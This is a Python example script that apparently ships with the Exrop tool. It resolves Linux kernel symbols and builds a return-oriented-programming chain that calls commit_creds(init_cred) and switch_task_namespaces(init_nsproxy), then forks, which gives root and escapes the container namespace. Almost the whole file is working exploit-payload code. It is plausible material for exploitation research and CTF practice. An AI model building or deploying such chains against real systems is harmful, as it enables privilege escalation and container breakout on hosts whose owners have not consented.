"""Example: Linux kernel namespace escape chain.

Builds a privilege escalation ROP chain:
  commit_creds(init_cred)
  find_task_by_vpid(1)
  switch_task_namespaces(result, init_nsproxy)
  fork()
  msleep(1000000000)

Adapted from the angrop linux_escape_chain example. Key difference:
Exrop's func_call() accepts register names as arguments natively, so
`func_call(f, ('rax', val))` replaces angrop's 3-step pattern of
move_regs + set_regs(preserve_regs) + func_call(preserve_regs).

Usage:
    PYTHONPATH=. python3 examples/linux_escape_chain.py /path/to/vmlinux
"""

import sys
from elftools.elf.elffile import ELFFile
from Exrop import Exrop


def resolve_symbols(vmlinux_path, names):
    """Read symbol addresses from the vmlinux ELF .symtab section."""
    symbols = {}
    with open(vmlinux_path, 'rb') as f:
        elf = ELFFile(f)
        symtab = elf.get_section_by_name('.symtab')
        if symtab is None:
            raise ValueError("No .symtab section found in {}".format(vmlinux_path))
        needed = set(names)
        for sym in symtab.iter_symbols():
            if sym.name in needed:
                symbols[sym.name] = sym['st_value']
                needed.discard(sym.name)
                if not needed:
                    break
    missing = set(names) - set(symbols)
    if missing:
        raise ValueError("Symbols not found: {}".format(', '.join(sorted(missing))))
    return symbols


if len(sys.argv) < 2:
    print("Usage: {} <vmlinux>".format(sys.argv[0]))
    sys.exit(1)

VMLINUX = sys.argv[1]

# Resolve kernel symbols
syms = resolve_symbols(VMLINUX, [
    'commit_creds', 'init_cred',
    'find_task_by_vpid',
    'switch_task_namespaces', 'init_nsproxy',
    '__x64_sys_fork',
    'msleep',
])

commit_creds     = syms['commit_creds']
init_cred        = syms['init_cred']
find_task_by_vpid = syms['find_task_by_vpid']
switch_task_namespaces = syms['switch_task_namespaces']
init_nsproxy     = syms['init_nsproxy']
x64_sys_fork     = syms['__x64_sys_fork']
msleep           = syms['msleep']

print("Resolved symbols:")
for name, addr in sorted(syms.items()):
    print("  {:<30s} 0x{:x}".format(name, addr))

# Load gadgets
e = Exrop(VMLINUX)
e.find_gadgets(cache=True, kernel_mode=True)
e.clean_only = True

# Build the chain
print("\n=== Building escape chain ===\n")

# 1. commit_creds(init_cred)
print("[*] commit_creds(init_cred)")
chain = e.func_call(commit_creds, (init_cred,))
chain.dump()

# 2. find_task_by_vpid(1) — result in rax
print("\n[*] find_task_by_vpid(1)")
chain2 = e.func_call(find_task_by_vpid, (1,))
chain.merge_ropchain(chain2)
chain2.dump()

# 3. switch_task_namespaces(rax, init_nsproxy)
#    rax holds the return value from find_task_by_vpid.
#    Exrop resolves 'rax' as a register reference, setting rdi=rax, rsi=init_nsproxy.
print("\n[*] switch_task_namespaces(rax, init_nsproxy)")
chain3 = e.func_call(switch_task_namespaces, ('rax', init_nsproxy))
chain.merge_ropchain(chain3)
chain3.dump()

# 4. fork()
print("\n[*] fork()")
chain4 = e.func_call(x64_sys_fork, (0,))
chain.merge_ropchain(chain4)
chain4.dump()

# 5. msleep(1000000000) — sleep in parent while child escapes
print("\n[*] msleep(1000000000)")
chain5 = e.func_call(msleep, (1000000000,))
chain.merge_ropchain(chain5)
chain5.dump()

print("\n=== Full chain ===\n")
chain.dump()
print("\nChain length: {} bytes".format(len(chain.payload_str())))
